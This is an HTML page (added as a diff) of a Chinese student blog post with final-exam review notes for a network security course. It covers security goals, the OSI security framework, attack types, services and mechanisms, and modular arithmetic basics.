@@ -1,0 +1,2953 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>复习||网络安全 - Doごみ箱</title><meta name="Description" content="Doごみ箱2.1"><meta property="og:title" content="复习||网络安全" />
+<meta property="og:description" content="网络安全复习23期末复习提纲 – 计算机与网络信息安全23秋中美 题型（暂定）：填空1x10=10分，选择1x20=20分，简答题6x5=30分，" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/cyber_security/" /><meta property="og:image" content="http://localhost:1313/logo.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-01-03T20:28:39+08:00" />
+<meta property="article:modified_time" content="2024-07-03T19:50:52+08:00" /><meta property="og:site_name" content="Doごみ箱" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="http://localhost:1313/logo.png" /><meta name="twitter:title" content="复习||网络安全"/>
+<meta name="twitter:description" content="网络安全复习23期末复习提纲 – 计算机与网络信息安全23秋中美 题型（暂定）：填空1x10=10分，选择1x20=20分，简答题6x5=30分，"/>
+<meta name="application-name" content="Doごみ箱">
+<meta name="apple-mobile-web-app-title" content="Doごみ箱">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="logo"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/posts/cyber_security/" /><link rel="prev" href="http://localhost:1313/posts/nihonngo/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "复习||网络安全",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/posts\/cyber_security\/"
+        },"genre": "posts","wordcount":  18133 ,
+        "url": "http:\/\/localhost:1313\/posts\/cyber_security\/","datePublished": "2024-01-03T20:28:39+08:00","dateModified": "2024-07-03T19:50:52+08:00","license": "dodola","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "DODOLA"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.1.1" defer type="module" integrity="sha384-MWfCL6g1OTGsbSwfuMHc8+8J2u71/LA8dzlIN3ycajckxuZZmF+DNjdm7O6H3PSq"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme; }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Doごみ箱"><span class="header-title-pre">🗑️</span>Doごみ箱2.1<span class="header-title-post">🐾</span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts">🐙 文章 </a><a class="menu-item" href="/categories/">📂 分类 </a><a class="menu-item" href="/tags/">🏷︎ 标签 </a><a class="menu-item" href="/links/">🧸 友链 </a><a class="menu-item" href="/about/">🍅 关于 </a><a class="menu-item" href="/comments/">🪗 留言 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="#" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="#" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Doごみ箱"><span class="header-title-pre">🗑️</span>Doごみ箱2.1<span class="header-title-post">🐾</span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="#" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="#" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts" title="">🐙文章</a><a class="menu-item" href="/categories/" title="">📂分类</a><a class="menu-item" href="/tags/" title="">🏷︎标签</a><a class="menu-item" href="/links/" title="">🧸友链</a><a class="menu-item" href="/about/" title="">🍅关于</a><a class="menu-item" href="/comments/" title="">🪗留言</a><a href="#" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "false")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">复习||网络安全</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><i class="author fas fa-user-circle fa-fw"></i><a href="http://dodolalorc.cn/" title="Author" target="_blank" rel="noopener noreferrer author" class="author">DODOLA</a>
+                </span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-01-03">2024-01-03</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-07-03">2024-07-03</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 18133 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 37 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="true">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#一概述">一、概述</a>
+      <ul>
+        <li><a href="#安全的三个基本目标cia">✨安全的三个基本目标CIA</a></li>
+        <li><a href="#安全的其他目标">✨安全的其他目标</a></li>
+        <li><a href="#osi安全框架x880">✨OSI安全框架X.880</a></li>
+        <li><a href="#osi安全体系框架">✨OSI安全体系框架</a></li>
+        <li><a href="#安全攻击">✨安全攻击</a></li>
+        <li><a href="#安全服务">✨安全服务</a></li>
+        <li><a href="#安全机制">✨安全机制</a></li>
+      </ul>
+    </li>
+    <li><a href="#二数论基础不在考试范围">二、数论基础（不在考试范围）</a>
+      <ul>
+        <li><a href="#模运算">模运算</a></li>
+        <li><a href="#模幂运算">模幂运算</a></li>
+        <li><a href="#剩余集">剩余集</a></li>
+        <li><a href="#欧拉函数">欧拉函数</a></li>
+        <li><a href="#欧拉定理">欧拉定理</a></li>
+      </ul>
+    </li>
+    <li><a href="#三传统加密技术">三、传统加密技术</a>
+      <ul>
+        <li><a href="#密钥算法分类">密钥算法分类</a></li>
+        <li><a href="#对称密码简化模型">对称密码简化模型</a></li>
+        <li><a href="#密码分析学">✨密码分析学</a></li>
+        <li><a href="#密码体系的攻击方法">✨密码体系的攻击方法</a></li>
+        <li><a href="#代换和置换古典密码">✨代换和置换（古典密码）</a>
+          <ul>
+            <li><a href="#常见古典密码算法">常见古典密码算法</a></li>
+            <li><a href="#代换技术-caesarshift-cipher移位密码">代换技术： Caesar/Shift Cipher移位密码</a></li>
+            <li><a href="#加法密码caesar密码是一种加法密码k3">加法密码（Caesar密码是一种加法密码）(k=3)</a></li>
+          </ul>
+        </li>
+        <li><a href="#单表代换密码">✨单表代换密码</a>
+          <ul>
+            <li><a href="#单表代换实例">单表代换实例</a></li>
+            <li><a href="#单表代换分析">单表代换分析</a></li>
+            <li><a href="#单表代换攻击步骤">单表代换攻击步骤</a></li>
+          </ul>
+        </li>
+        <li><a href="#多表代换vigenère密码">✨多表代换(Vigenère密码)</a>
+          <ul>
+            <li><a href="#字母出现的相对频率">字母出现的相对频率</a></li>
+          </ul>
+        </li>
+        <li><a href="#vernam密码1918">Vernam密码（1918）</a></li>
+        <li><a href="#one-time-pad-一次一密">✨One-time Pad 一次一密</a>
+          <ul>
+            <li>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#一次一密的安全性">一次一密的安全性</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li><a href="#无条件安全与计算上安全">无条件安全与计算上安全</a></li>
+            <li><a href="#置换技术">置换技术</a>
+              <ul>
+                <li><a href="#更复杂的列置换">更复杂的列置换</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#四分组密码和数据加密标准des">四、分组密码和数据加密标准DES</a>
+      <ul>
+        <li><a href="#对称密码分类及区别">✨对称密码分类及区别</a></li>
+        <li><a href="#分组密码">分组密码</a>
+          <ul>
+            <li><a href="#des数据加密">✨DES数据加密</a></li>
+            <li><a href="#feisteldes加密框架">✨Feistel(DES)加密框架</a>
+              <ul>
+                <li><a href="#feistel网络">✨Feistel网络</a></li>
+                <li><a href="#feistelfor-loop">Feistel——&lsquo;for&rsquo; Loop</a></li>
+              </ul>
+            </li>
+            <li><a href="#des安全强度">✨DES安全强度</a>
+              <ul>
+                <li><a href="#穷举密钥搜索所需要的时间">穷举密钥搜索所需要的时间</a></li>
+              </ul>
+            </li>
+            <li><a href="#双重des">✨双重DES</a></li>
+            <li><a href="#中间相遇攻击">中间相遇攻击</a></li>
+            <li><a href="#3des三重destdea">✨3DES——三重DES(TDEA)</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#五有限域不在考试范围">五、有限域（不在考试范围）</a></li>
+    <li><a href="#六高级加密标准aes128">六、高级加密标准AES——128</a>
+      <ul>
+        <li><a href="#从3des到高级数据加密标准aes">从3DES到高级数据加密标准AES</a></li>
+        <li><a href="#高级加密标准aes准则">高级加密标准AES准则</a></li>
+        <li><a href="#aes分组长度密钥长度">✨AES分组长度、密钥长度</a></li>
+        <li><a href="#表61">✨表6.1</a></li>
+        <li><a href="#aes每轮中的操作">AES每轮中的操作</a>
+          <ul>
+            <li><a href="#以aes-128为例即128密钥">以AES-128为例，即128密钥</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#七分组加密的工作模式">七、分组加密的工作模式</a>
+      <ul>
+        <li><a href="#分组密码的工作模式表71">分组密码的工作模式(表7.1)</a></li>
+        <li><a href="#ecb电话本模式">✨ECB：电话本模式</a></li>
+        <li><a href="#cbc密文分组链接模式">✨CBC：密文分组链接模式</a></li>
+        <li><a href="#cfb密文反馈模式">✨CFB：密文反馈模式</a></li>
+        <li><a href="#ofb输出反馈模式">✨OFB：输出反馈模式</a></li>
+        <li><a href="#ctr计数器模式">✨CTR：计数器模式</a></li>
+      </ul>
+    </li>
+    <li><a href="#八伪随机数的产生和流密码">八、伪随机数的产生和流密码</a></li>
+    <li><a href="#九公钥密码学与rsa">九、公钥密码学与RSA</a>
+      <ul>
+        <li><a href="#公钥密码术语表91">公钥密码术语(表9.1)</a></li>
+        <li><a href="#公钥密码体制图91a">✨公钥密码体制(✨图9.1(a))</a>
+          <ul>
+            <li><a href="#用公钥加密">用公钥加密</a></li>
+            <li><a href="#用私钥加密">用私钥加密</a></li>
+          </ul>
+        </li>
+        <li><a href="#公钥密码体制的应用">✨公钥密码体制的应用</a>
+          <ul>
+            <li><a href="#公钥算法用于认证">公钥算法用于认证</a></li>
+            <li><a href="#消息来源认证和数字签名">消息来源认证和数字签名</a>
+              <ul>
+                <li><a href="#消息来源认证">消息来源认证</a></li>
+                <li><a href="#认证保密">认证保密</a></li>
+                <li><a href="#签名的具体实现">签名的具体实现</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#公钥密码的特点">✨公钥密码的特点</a></li>
+        <li><a href="#公钥算法安全性的数学基础">公钥算法安全性的数学基础</a>
+          <ul>
+            <li><a href="#模幂运算-1">✨模幂运算</a></li>
+            <li><a href="#rsa算法的计算">✨✨RSA算法的计算</a>
+              <ul>
+                <li><a href="#rsa算法描述">RSA算法描述</a></li>
+                <li><a href="#生成密钥对">生成密钥对</a></li>
+                <li><a href="#例题">例题</a></li>
+              </ul>
+            </li>
+            <li><a href="#针对rsa的攻击">针对RSA的攻击</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#十密钥管理和其他公钥密码体制">十、密钥管理和其他公钥密码体制</a>
+      <ul>
+        <li><a href="#dh密钥交换算法">DH密钥交换算法</a></li>
+        <li><a href="#针对dh算法的中间人攻击">针对DH算法的中间人攻击</a></li>
+        <li><a href="#椭圆曲线密码学ecc">✨椭圆曲线密码学(ECC)</a></li>
+      </ul>
+    </li>
+    <li><a href="#十一密码学hash函数">十一、密码学hash函数</a>
+      <ul>
+        <li><a href="#散列函数的应用">散列函数的应用</a>
+          <ul>
+            <li><a href="#用于消息认证">用于消息认证</a></li>
+            <li><a href="#用于数字签名">用于数字签名</a></li>
+            <li><a href="#其他应用">其他应用</a></li>
+          </ul>
+        </li>
+        <li><a href="#针对hash函数的攻击">针对Hash函数的攻击</a></li>
+        <li><a href="#sha参数比较">SHA参数比较</a></li>
+      </ul>
+    </li>
+    <li><a href="#十二消息认证码">十二、消息认证码</a>
+      <ul>
+        <li><a href="#消息认证">消息认证</a>
+          <ul>
+            <li><a href="#消息认证的需求">消息认证的需求</a></li>
+            <li><a href="#实现消息认证">实现消息认证</a></li>
+          </ul>
+        </li>
+        <li><a href="#消息认证码mac">消息认证码MAC</a>
+          <ul>
+            <li><a href="#消息认证码的实现方式的两种方式">消息认证码的实现方式的两种方式</a></li>
+            <li><a href="#消息认证码的基本用途图124">消息认证码的基本用途(图12.4)</a></li>
+          </ul>
+        </li>
+        <li><a href="#认证加密gcm">认证加密GCM</a></li>
+      </ul>
+    </li>
+    <li><a href="#十三数字签名技术">十三、数字签名技术</a></li>
+    <li><a href="#十四轻量级密码和后量子密码">十四、轻量级密码和后量子密码</a></li>
+    <li><a href="#十五密钥管理与分发">十五、密钥管理与分发</a></li>
+    <li><a href="#十六用户认证">十六、用户认证</a>
+      <ul>
+        <li><a href="#质询应答challengeresponse的基本逻辑">质询/应答challenge/response的基本逻辑</a></li>
+        <li><a href="#质询应答的实现方式">质询应答的实现方式</a></li>
+        <li><a href="#常见网络攻击">常见网络攻击</a>
+          <ul>
+            <li><a href="#嗅探的目的">嗅探的目的</a></li>
+            <li><a href="#欺骗arp欺骗ip欺骗">欺骗(ARP欺骗、IP欺骗)</a>
+              <ul>
+                <li><a href="#arp攻击的应用场景">ARP攻击的应用场景</a></li>
+                <li><a href="#arp欺骗攻击防范措施">ARP欺骗攻击防范措施</a></li>
+                <li><a href="#网络层----ip源地址欺骗">网络层 &ndash; IP源地址欺骗</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#十七传输层安全">十七、传输层安全</a>
+      <ul>
+        <li><a href="#web安全性威胁对照表">Web安全性威胁对照表</a></li>
+        <li><a href="#tcpip协议栈中安全功能的相对位置">TCP/IP协议栈中安全功能的相对位置</a></li>
+        <li><a href="#tls体系结构">TLS体系结构</a></li>
+        <li><a href="#握手协议过程">✨握手协议过程</a></li>
+        <li><a href="#wireshark抓包实验">✨✨wireshark抓包实验</a>
+          <ul>
+            <li><a href="#实际抓包截图分析">实际抓包截图分析</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#十九无线网络安全">十九、无线网络安全</a>
+      <ul>
+        <li><a href="#防火墙类型">防火墙类型</a></li>
+      </ul>
+    </li>
+    <li><a href="#其他">其他：</a>
+      <ul>
+        <li><a href="#windows常用基本命令">windows常用基本命令</a>
+          <ul>
+            <li><a href="#ping">ping</a></li>
+            <li><a href="#nslookup">nslookup</a></li>
+            <li><a href="#ipconfig">ipconfig</a></li>
+            <li><a href="#ifconfig">ifconfig</a></li>
+            <li><a href="#arp">arp</a></li>
+            <li><a href="#chmod">✨chmod</a></li>
+            <li><a href="#ls">ls</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="网络安全复习23" class="headerLink">
+    <a href="#%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8%e5%a4%8d%e4%b9%a023" class="header-mark"></a>网络安全复习23</h1><p>期末复习提纲 – 计算机与网络信息安全23秋中美</p>
+<p>题型（暂定）：填空1x10=10分，选择1x20=20分，简答题6x5=30分，应用题4x10=40分，总分100分，折合60%，平时成绩40%。</p>
+<h2 id="一概述" class="headerLink">
+    <a href="#%e4%b8%80%e6%a6%82%e8%bf%b0" class="header-mark"></a>一、概述</h2><blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌计算机安全目标/有哪些？其含义分别是什么？（最核心的三个目标CIA、以及真实性、可追溯性/可审查性）</li>
+</ul>
+</blockquote>
+<h3 id="安全的三个基本目标cia" class="headerLink">
+    <a href="#%e5%ae%89%e5%85%a8%e7%9a%84%e4%b8%89%e4%b8%aa%e5%9f%ba%e6%9c%ac%e7%9b%ae%e6%a0%87cia" class="header-mark"></a>✨安全的三个基本目标CIA</h3><ul>
+<li><strong>机密性（ Confidentiality ）</strong> 对信息的访问和公开进行授权限制
+<ul>
+<li>数据保密性：确保隐私或者密码信息不向非授权者泄露，也不被非授权者所使用</li>
+<li>隐私性：确保个人能够控制或确定与其自身相关的哪些信息是可以被收集、被保存的，这些信息可以由谁来公开以及向谁公开</li>
+</ul>
+</li>
+<li><strong>完整性（ Integrity ）</strong> 防止对信息的不恰当修改或破坏
+<ul>
+<li>数据完整性：包括信息和程序只能以特定和授权的方式进行改变。还包括数据真实性和不可否认性。</li>
+<li>系统完整性：确保系统以一种正常的方式来执行预定的功能</li>
+</ul>
+</li>
+<li><strong>可用性（ Availability ）</strong> 确保对信息的及时和可靠的访问和使用，对授权用户不能拒绝服务</li>
+</ul>
+<h3 id="安全的其他目标" class="headerLink">
+    <a href="#%e5%ae%89%e5%85%a8%e7%9a%84%e5%85%b6%e4%bb%96%e7%9b%ae%e6%a0%87" class="header-mark"></a>✨安全的其他目标</h3><ul>
+<li>
+<p><strong>真实性(authenticity)、认证/鉴别</strong>：一个实体是真实的、可被验证的和可被信任的特性；对传输信息来说，信息和信息源是正确的。</p>
+</li>
+<li>
+<p><strong>审计性（Accountability）、可追溯性</strong>：要求通过实体的行为可以唯一追溯到该实体，支持不可否认性、阻止、故障隔离、入侵检测和预防、事后恢复，以及法律诉讼。</p>
+<ul>
+<li>不可否认性（Non-repudiation ）：要求无论发送方还是接收方都不能抵赖所进行的传输或操作</li>
+</ul>
+</li>
+<li>
+<p><strong>可控性（ controllability ）</strong></p>
+<ul>
+<li>能够掌握和控制信息及信息系统的情况，对信息和 信息系统的使用进行可靠的授权、审计、责任认定、 传播源与传播路径的跟踪和监管等。</li>
+</ul>
+</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240102142921914.png" title="image-20240102142921914" data-thumbnail="/posts/cyber_security/image-20240102142921914.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240102142921914.png"
+            srcset="/posts/cyber_security/image-20240102142921914.png, /posts/cyber_security/image-20240102142921914.png 1.5x, /posts/cyber_security/image-20240102142921914.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240102142921914.png" height="392"  width="525" >
+    </a></figure></p>
+<blockquote>
+<ul>
+<li><i class="far fa-check-square fa-fw"></i> 👌OSI安全框架定义了哪三个方面？安全机制和安全服务；安全攻击被分成哪两个类别，有什么特点？分别有哪些实例？（可以与实际安全问题相结合）。</li>
+</ul>
+</blockquote>
+<h3 id="osi安全框架x880" class="headerLink">
+    <a href="#osi%e5%ae%89%e5%85%a8%e6%a1%86%e6%9e%b6x880" class="header-mark"></a>✨OSI安全框架X.880</h3><ul>
+<li><strong>安全攻击</strong>：任何（试图收集、破坏、拒绝、降级或破坏信息系统资源或信息本身的）恶意活动
+<ul>
+<li>威胁：潜在可能的</li>
+</ul>
+</li>
+<li><strong>安全机制</strong>：用来检测、阻止攻击或者从攻击状态恢复到正常状态的过程（或实现该过程的设备）</li>
+<li><strong>安全服务</strong>：加强数据处理系统和信息传输的安全性的一种处理过程或通信服务
+<ul>
+<li>支持一个或多个安全需求（CIAAA）的功能</li>
+<li>安全服务通过安全机制来实现安全策略。</li>
+</ul>
+</li>
+</ul>
+<h3 id="osi安全体系框架" class="headerLink">
+    <a href="#osi%e5%ae%89%e5%85%a8%e4%bd%93%e7%b3%bb%e6%a1%86%e6%9e%b6" class="header-mark"></a>✨OSI安全体系框架</h3><p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240102144311708.png" title="image-20240102144311708" data-thumbnail="/posts/cyber_security/image-20240102144311708.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240102144311708.png"
+            srcset="/posts/cyber_security/image-20240102144311708.png, /posts/cyber_security/image-20240102144311708.png 1.5x, /posts/cyber_security/image-20240102144311708.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240102144311708.png" height="838"  width="1356" >
+    </a></figure></p>
+<h3 id="安全攻击" class="headerLink">
+    <a href="#%e5%ae%89%e5%85%a8%e6%94%bb%e5%87%bb" class="header-mark"></a>✨安全攻击</h3><ul>
+<li><strong>被动攻击</strong>：对传输进行窃听和监测以获取传输的信息
+<ul>
+<li>信息内容泄露</li>
+<li>流量分析</li>
+</ul>
+</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240102143340520.png" title="image-20240102143340520" data-thumbnail="/posts/cyber_security/image-20240102143340520.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240102143340520.png"
+            srcset="/posts/cyber_security/image-20240102143340520.png, /posts/cyber_security/image-20240102143340520.png 1.5x, /posts/cyber_security/image-20240102143340520.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240102143340520.png" height="517"  width="837" >
+    </a></figure></p>
+<ul>
+<li><strong>主动攻击</strong>：对数据流进行修改或者伪造数据流
+<ul>
+<li>伪装、重放、消息篡改和拒绝服务</li>
+<li>伪装和消息篡改都可能涉及中间人攻击</li>
+</ul>
+</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/cyber_security/image-20240102143437314.png" title="image-20240102143437314" data-thumbnail="/posts/cyber_security/image-20240102143437314.png">
+        <img
+            
+            loading="lazy"
+            src="/posts/cyber_security/image-20240102143437314.png"
+            srcset="/posts/cyber_security/image-20240102143437314.png, /posts/cyber_security/image-20240102143437314.png 1.5x, /posts/cyber_security/image-20240102143437314.png 2x"
+            sizes="auto"
+            alt="/posts/cyber_security/image-20240102143437314.png" height="553"  width="863" >
+    </a></figure></p>
+<h3 id="安全服务" class="headerLink">
+    <a href="#%e5%ae%89%e5%85%a8%e6%9c%8d%e5%8a%a1" class="header-mark"></a>✨安全服务</h3><ul>
+<li>
+<p>安全服务：通信开放系统的协议层提供的服务，从而保证系统或数据传输有足够的安全性。安全服务通过安全机制来实现安全策略。</p>
+</li>
+<li>
+<p>安全服务包括：</p>
+<ul>
+<li>认证：（你是谁,你来自谁）</li>
+<li>访问控制： （你能干什么，授权）</li>
+<li>数据保密性： （加密：明文变密文）</li>
+<li>数据完整性： （不求保密但求发现篡改假冒）</li>
+<li>不可否认性： （防止对收到或发出消息抵赖）</li>
+<li>可用性服务</li>
+</ul>
+</li>
+</ul>
+<h3 id="安全机制" class="headerLink">
+    <a href="#%e5%ae%89%e5%85%a8%e6%9c%ba%e5%88%b6" class="header-mark"></a>✨安全机制</h3><ul>
+<li>
+<p>用来检测、阻止攻击或者从攻击状态恢复到正常状态的过程（或实现该过程的设备）</p>
+</li>
+<li>
+<p>安全机制分为：</p>
+<ul>
+<li>密码算法、数据完整性、数字签名、认证交换（身份认证）、流量填充、路由控制、公证、访问控制</li>
+</ul>
+</li>
+<li>
+<p>没有任何一种安全机制可解决所有的安全问题</p>
+</li>
+</ul>
+<h2 id="二数论基础不在考试范围" class="headerLink">
+    <a href="#%e4%ba%8c%e6%95%b0%e8%ae%ba%e5%9f%ba%e7%a1%80%e4%b8%8d%e5%9c%a8%e8%80%83%e8%af%95%e8%8c%83%e5%9b%b4" class="header-mark"></a>二、数论基础（不在考试范围）</h2><h3 id="模运算" class="headerLink">
+    <a href="#%e6%a8%a1%e8%bf%90%e7%ae%97" class="header-mark"></a>模运算</h3><ul>
+<li>
+<p>模运算即求余数（C语言中的运算符％）</p>
+<p><code>x mod n＝a</code>
+其中0≤a&lt;n, 且有整数k使kn＋a＝x。整数n称为模数。
+如：<code>5％3＝2；8％7＝1；16％12＝4</code></p>
+</li>
+<li>
+<p>同余关系</p>
+<p>若 <code>x mod n＝y mod n [＝ a]</code></p>
+<p>则说x和y是模n同余的，记<code>x ≡ y mod n</code>
+如：<code>13 ≡ 6 mod 7；20 ≡ 7 mod 13</code></p>
+</li>
+<li>
+<p>摸算术运算</p>
+<ul>
+<li>
+<p><code>（a＋b） mod n ＝ (a mod n＋b mod n) mod n</code></p>
+</li>
+<li>
+<p><code>（a－b） mod n ＝ (a mod n－b mod n) mod n</code></p>
+</li>
+<li>
+<p><code>（a×b） mod n ＝ (a mod n×b mod n) mod n</code></p>
+</li>
+<li>
+<p>举例：</p>
+<blockquote>
+<p><code>11 mod 8 = 3;      15 mod 8 = 7</code></p>
+<p><code>[(11 mod 8) + (15 mod 8)] mod 8 = 10 mod 8 = 2</code>
+<code>(11 + 15) mod 8 =  26 mod 8 = 2</code>
+<code>[(11 mod 8) - (15 mod 8)] mod 8 = - 4 mod 8 = 4</code>
+<code>(11 -  15) mod 8 = - 4 mod 8 =  4</code>
+<code>[(11 mod 8) *  (15 mod 8)] mod 8 =  21 mod 8 = 5</code>
+<code>(11 * 15) mod 8 = 165 mod 8 =  5</code></p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="模幂运算" class="headerLink">
+    <a href="#%e6%a8%a1%e5%b9%82%e8%bf%90%e7%ae%97" class="header-mark"></a>模幂运算</h3><ul>
+<li>
+<p><code>（a×b） mod n ＝ (a mod n×b mod n) mod n</code></p>
+<p>幂运算：求117mod 13=?</p>
+<blockquote>
+<p>11^2^ = 121 ≡ 4 mod 13</p>
+<p>11^4^ = (11^2^)^2^ ≡ 4^2^ ≡ 3 mod 13</p>
+<p>11^7^ = 11×4×3 ≡132 ≡ 2 mod 13</p>
+</blockquote>
+</li>
+<li>
+<p><strong>用于RSA中的模幂运算</strong></p>
+</li>
+</ul>
+<h3 id="剩余集" class="headerLink">
+    <a href="#%e5%89%a9%e4%bd%99%e9%9b%86" class="header-mark"></a>剩余集</h3><ul>
+<li>
+<p>模n的剩余集</p>
+<p>定义比n小的非负整数集合为Zn ：</p>
+<p><code> Zn＝{0，1，2，3，…，n-1}</code>
